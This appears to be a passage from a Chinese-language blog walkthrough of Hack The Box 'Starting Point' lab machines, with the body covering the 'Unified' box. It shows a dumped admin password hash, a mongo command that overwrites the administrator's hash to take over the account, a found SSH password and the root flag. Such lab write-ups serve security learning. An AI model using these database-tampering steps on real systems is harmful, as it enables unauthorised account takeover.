+<p><img src="https://hackmd.io/_uploads/H1VfHedSJe.png" alt="image"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;_id&quot; : ObjectId(&quot;61ce278f46e0fb0012d47ee4&quot;),</span><br><span class="line">&quot;name&quot; : &quot;administrator&quot;,</span><br><span class="line">&quot;email&quot; : &quot;administrator@unified.htb&quot;,</span><br><span class="line">&quot;x_shadow&quot; : &quot;$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.&quot;,</span><br><span class="line">&quot;time_created&quot; : NumberLong(1640900495),</span><br><span class="line">&quot;last_site_name&quot; : &quot;default&quot;,</span><br></pre></td></tr></table></figure>
+<p>雜湊演算法的標識符 <code>$6$</code> &#x3D;&gt; SHA-512<br>嘗試變更 administrator的 x_shadow<br>自訂密碼 <code>1234</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ mkpasswd -m sha-512 1234                                                         </span><br><span class="line">$6$GwelwCMmlk9Lkvhr<span class="variable">$rJkhTGjKXKjcVbreMxM7LsJkPMjo</span>.VIReWqC5S8b5zY30CtyRZxrb.7TIIA5ZNsmM7.f4ONZlesi0bH7JosQL1</span><br></pre></td></tr></table></figure>
+<p>用<code>db.admin.update()</code>變更 x_shadow</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">db.admin.update(</span><br><span class="line">  &lt;query&gt;,       // 查詢條件 (filter)</span><br><span class="line">  &lt;update&gt;,      // 更新操作</span><br><span class="line">  &lt;options&gt;      // 選項 (如 upsert 和 multi)</span><br><span class="line">)</span><br><span class="line">ex.</span><br><span class="line">db.admin.update(</span><br><span class="line">  &#123; username: &quot;admin&quot; &#125;, </span><br><span class="line">  &#123; $set: &#123; password: &quot;newpassword123&quot; &#125; &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongo --port 27117 ace --<span class="built_in">eval</span> <span class="string">&#x27;db.admin.update(&#123;&quot;_id&quot; : ObjectId(&quot;61ce278f46e0fb0012d47ee4&quot;)&#125;,&#123;$set:&#123;&quot;x_shadow&quot; : &quot;$6$GwelwCMmlk9Lkvhr$rJkhTGjKXKjcVbreMxM7LsJkPMjo.VIReWqC5S8b5zY30CtyRZxrb.7TIIA5ZNsmM7.f4ONZlesi0bH7JosQL1&quot;&#125;&#125;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/ryKuVb_SJl.png" alt="image"><br>以 <code>administrator</code>:<code>1234</code> 登入成功<br><img src="https://hackmd.io/_uploads/SJLRVZ_ryl.png" alt="image"><br>發現ssh密碼 <code>NotACrackablePassword4U2022</code><br><img src="https://hackmd.io/_uploads/H1aiBW_rJg.png" alt="image"><br><img src="https://hackmd.io/_uploads/B1rHU-_HJe.png" alt="image"><br><img src="https://hackmd.io/_uploads/By3PI-_BJl.png" alt="image"><br>root flag <code>e50bc93c75b634e4b272d2f771c33681</code></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tag/">Tag</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Three"><span class="toc-number">1.</span> <span class="toc-text">Three</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumeration"><span class="toc-number">1.1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S3-bucket"><span class="toc-number">1.2.</span> <span class="toc-text">S3 bucket</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oopsie"><span class="toc-number">2.</span> <span class="toc-text">Oopsie</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumeration-1"><span class="toc-number">2.1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Foothold"><span class="toc-number">2.2.</span> <span class="toc-text">Foothold</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lateral-Movement"><span class="toc-number">2.3.</span> <span class="toc-text">Lateral Movement</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">2.4.</span> <span class="toc-text">Privilege Escalation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vaccine"><span class="toc-number">3.</span> <span class="toc-text">Vaccine</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumeration-2"><span class="toc-number">3.1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Foothold-1"><span class="toc-number">3.2.</span> <span class="toc-text">Foothold</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-Escalation-1"><span class="toc-number">3.3.</span> <span class="toc-text">Privilege Escalation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unified"><span class="toc-number">4.</span> <span class="toc-text">Unified</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumeration-3"><span class="toc-number">4.1.</span> <span class="toc-text">Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploitation"><span class="toc-number">4.2.</span> <span class="toc-text">Exploitation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-Escalation-2"><span class="toc-number">4.3.</span> <span class="toc-text">Privilege Escalation</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/02/HTB-Starting-Point-Linux/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&text=HTB Starting Point (Linux)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&is_video=false&description=HTB Starting Point (Linux)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Starting Point (Linux)&body=Check out this article: http://example.com/2025/05/02/HTB-Starting-Point-Linux/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&title=HTB Starting Point (Linux)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&name=HTB Starting Point (Linux)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/02/HTB-Starting-Point-Linux/&t=HTB Starting Point (Linux)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    wang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tag/">Tag</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
